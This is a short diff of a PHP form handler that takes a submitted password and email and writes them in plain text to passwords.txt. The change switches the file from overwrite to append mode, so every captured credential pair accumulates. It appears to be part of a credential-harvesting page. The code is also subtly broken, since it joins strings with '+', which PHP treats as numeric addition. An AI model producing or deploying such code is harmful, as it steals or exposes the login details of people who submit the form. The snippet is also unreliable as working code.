@@ -4,7 +4,7 @@
   <?php
     $password = $_POST["password"];
     $email = $_POST["email"];
-    $pw_log = fopen("passwords.txt", "w");
+    $pw_log = fopen("passwords.txt", "a");
     fwrite($pw_log, $password + " " + $email + PHP_EOL);
     fclose($pw_log);
   ?>
